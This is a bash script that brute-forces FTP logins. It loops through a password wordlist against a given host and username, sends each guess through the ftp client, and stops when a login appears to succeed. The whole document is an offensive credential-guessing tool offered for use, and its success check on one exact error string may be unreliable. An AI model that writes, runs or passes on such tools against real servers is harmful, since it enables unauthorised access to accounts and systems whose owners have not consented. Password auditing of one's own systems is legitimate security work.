#!/bin/bash

#
# Simple script to brute force in protocol ftp
# Date: 2017/07/18 - version 0.1
#
# Inspired by: https://gist.github.com/hc0d3r/5845045
# Author: João Lucas <joaolucas@linuxmail.org>


function_usage() {
	cat << EOF
	Simple script to brute force in protocol ftp
	Usage: $0 -t <host|ip> -w <wordlist> -u <user>
	Example: $0 -t 192.168.0.1 -w /home/user/rockyou.txt -u admin
EOF

exit 1;
}


function_bfftp() {
	testpass=$(ftp -n "$1" << _CONECTION
	quote USER $2
	quote PASS $3
	quit
_CONECTION

)


if test "$testpass" = "Login incorrect."; then
	return 1
else
	return 0
fi


}

while getopts t:w:u: opt; do
	case $opt in
		"t") host="${OPTARG}" ;;
		"w") wordlist="${OPTARG}" ;;
		"u") user="${OPTARG}" ;;
		"*") function_usage ;;
	esac
done


[ $host ] || function_usage;
[ $wordlist ] || function_usage;
[ $user ] || function_usage;

echo -e "\n[  TARGET  ]: $host \n[   USER   ]: $user \n[ WORDLIST ]: `wc -l $wordlist | awk '{print $1}'` \n"


for password in $(cat $wordlist); do
	echo -e "[  TEST  ] Testing the password: $password"
	test=$(function_bfftp $host $user $password)
	result=$(echo $?)

	if test $result -eq 1; then
		echo -e "[ FAILED ] Password incorrect! \n"
	else
		echo -e "[   OK   ] Password correct: $password"
		break
	fi
done
